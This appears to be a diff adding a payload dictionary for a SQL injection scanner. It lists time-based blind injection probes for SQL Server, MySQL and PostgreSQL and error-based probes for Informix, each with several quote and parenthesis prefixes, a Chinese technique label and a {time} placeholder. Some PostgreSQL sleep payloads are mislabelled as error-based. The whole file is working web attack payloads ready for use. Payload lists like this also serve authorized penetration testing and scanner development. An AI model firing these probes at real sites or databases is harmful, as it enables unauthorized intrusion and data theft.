@@ -1,0 +1,25 @@
+﻿ if(1=1) waitfor delay '0:0:{time}'--：SQLServer延时注入：SQLServer：if(1=1) waitfor delay '0:0:{time}'
+' if(1=1) waitfor delay '0:0:{time}'--：SQLServer延时注入：SQLServer：if(1=1) waitfor delay '0:0:{time}'
+;if(1=1) waitfor delay '0:0:{time}'--：SQLServer延时注入：SQLServer：if(1=1) waitfor delay '0:0:{time}'
+';if(1=1) waitfor delay '0:0:{time}'--：SQLServer延时注入：SQLServer：if(1=1) waitfor delay '0:0:{time}'
+');if(1=1) waitfor delay '0:0:{time}'--：SQLServer延时注入：SQLServer：if(1=1) waitfor delay '0:0:{time}'
+);if(1=1) waitfor delay '0:0:{time}'--：SQLServer延时注入：SQLServer：if(1=1) waitfor delay '0:0:{time}'
+ and (select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)#：MySQL延时注入：MySQL：(select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)
+) and (select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)#：MySQL延时注入：MySQL：(select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)
+' and (select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)#：MySQL延时注入：MySQL：(select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)
+') and (select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)#：MySQL延时注入：MySQL：(select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)
+ (select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)#：MySQL延时注入：MySQL：(select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)
+,(select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)#：MySQL延时注入：MySQL：(select 1 from (select(sleep({time}-(if((1=1), 0, {time})))))test)
+ and (case when (1=1) then (select false from pg_sleep({time})) else false end)--：PostgreSQL 延时注入：PostgreSQL：(case when (1=1) then (select false from pg_sleep({time})) else false end)
+' and (case when (1=1) then (select false from pg_sleep({time})) else false end)--：PostgreSQL 延时注入：PostgreSQL：(case when (1=1) then (select false from pg_sleep({time})) else false end)
+) and (case when (1=1) then (select false from pg_sleep({time})) else false end)--：PostgreSQL 延时注入：PostgreSQL：(case when (1=1) then (select false from pg_sleep({time})) else false end)
+') and (case when (1=1) then (select false from pg_sleep({time})) else false end)--：PostgreSQL 延时注入：PostgreSQL：(case when (1=1) then (select false from pg_sleep({time})) else false end)
+ (case when (1=1) then (select false from pg_sleep({time})) else false end)--：PostgreSQL错误显示注入：PostgreSQL：(case when (1=1) then (select false from pg_sleep({time})) else false end)
+,(case when (1=1) then (select false from pg_sleep({time})) else false end)--：PostgreSQL错误显示注入：PostgreSQL：(case when (1=1) then (select false from pg_sleep({time})) else false end)
+;(select (case when (1=1) then (select false from pg_sleep({time})) else false end))--：PostgreSQL 延时注入：PostgreSQL：(select (case when (1=1) then (select false from pg_sleep({time})) else false end))
+);(select (case when (1=1) then (select false from pg_sleep({time})) else false end))--：PostgreSQL 延时注入：PostgreSQL：(select (case when (1=1) then (select false from pg_sleep({time})) else false end))
+');(select (case when (1=1) then (select false from pg_sleep({time})) else false end))--：PostgreSQL 延时注入：PostgreSQL：(select (case when (1=1) then (select false from pg_sleep({time})) else false end))
+and 1=(case when(1=1) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)--：Informix错误显示注入：Informix：1=(case when(1=1) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)
+' and 1=(case when(1=1) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)--：Informix错误显示注入：Informix：1=(case when(1=1) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)
+ (case when(1=1) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)--：Informix错误显示注入：Informix：(case when(1=1) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)
+,(case when(1=1) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)--：Informix错误显示注入：Informix：(case when(1=1) then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)
